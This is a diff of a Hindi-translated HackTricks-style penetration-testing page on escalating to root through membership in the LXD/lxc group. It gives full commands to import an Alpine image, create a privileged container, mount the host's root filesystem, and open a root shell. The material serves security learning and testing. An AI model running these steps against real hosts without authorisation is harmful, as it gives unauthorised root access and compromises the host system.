@@ -1,14 +1,16 @@
 # lxd/lxc Group - Privilege escalation
 
+{{#include ../../../banners/hacktricks-training.md}}
+
 Host के LXD management group (आमतौर पर _**lxd**_) की membership daemon पर पूरा control देकर root तक पहुंचने का रास्ता प्रदान कर सकती है।<sup>[[1]](#references)</sup>
 
-## Exploiting without internet
+## इंटरनेट के बिना Exploiting
 
 ### Method 1
 
 आप LXD के साथ उपयोग करने के लिए किसी trusted repository से Alpine image download कर सकते हैं।
 Canonical का LXD image server daily builds प्रकाशित करता है: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-नवीनतम build से केवल **lxd.tar.xz** और **rootfs.squashfs** दोनों प्राप्त करें (directory का नाम date होता है)।<sup>[[8]](#references)</sup>
+नवीनतम build से **lxd.tar.xz** और **rootfs.squashfs** दोनों ले लें (directory का नाम date होता है)।<sup>[[8]](#references)</sup>
 
 वैकल्पिक रूप से, आप [project instructions](https://github.com/lxc/distrobuilder) का पालन करके अपनी machine पर distrobuilder install कर सकते हैं।<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
@@ -33,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-**incus.tar.xz** (**lxd.tar.xz** यदि आपने Canonical image server से download किया है) और **rootfs.squashfs** upload करें, फिर image को import करके एक container बनाएँ।<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
+**incus.tar.xz** (**lxd.tar.xz** यदि आपने Canonical image server से download किया है) और **rootfs.squashfs** को upload करें, फिर image को import करके एक container बनाएँ।<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -49,8 +51,8 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> यदि आपको यह error _**Error: No storage pool found. Please create a new storage pool**_ मिले\
-> **`lxd init`** चलाएँ, एक default storage pool सेट अप करें, फिर commands के पिछले chunk को दोबारा चलाएँ।<sup>[[2]](#references)</sup>
+> यदि आपको यह error _**Error: No storage pool found. Please create a new storage pool**_ मिलता है\
+> **`lxd init`** चलाएँ, एक default storage pool सेट अप करें, फिर commands के पिछले chunk को दोहराएँ।<sup>[[2]](#references)</sup>
 
 अंत में, container शुरू करें और host filesystem पर root shell खोलें:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
@@ -58,9 +60,9 @@ lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### विधि 2
+### Method 2
 
-एक Alpine image बनाएँ और इसे `security.privileged=true` flag के साथ शुरू करें, जो container root को host root से map करता है; इसके बाद `/` को mount करने से host filesystem container के अंदर उजागर हो जाता है।<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+एक Alpine image बनाएँ और उसे `security.privileged=true` flag के साथ शुरू करें, जो container root को host root से map करता है; इसके बाद `/` को mounting करने से container के अंदर host filesystem exposed हो जाता है।<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -84,7 +86,7 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 
 - [1] [LXD के लिए security को harden कैसे करें](https://canonical.com/lxd/docs/latest/howto/security_harden/)
 - [2] [LXD containers और virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
-- [3] [images को copy और import कैसे करें](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [3] [Images को copy और import कैसे करें](https://canonical.com/lxd/docs/latest/howto/images_copy/)
 - [4] [distrobuilder](https://github.com/lxc/distrobuilder)
 - [5] [distrobuilder के साथ images कैसे build करें](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
 - [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
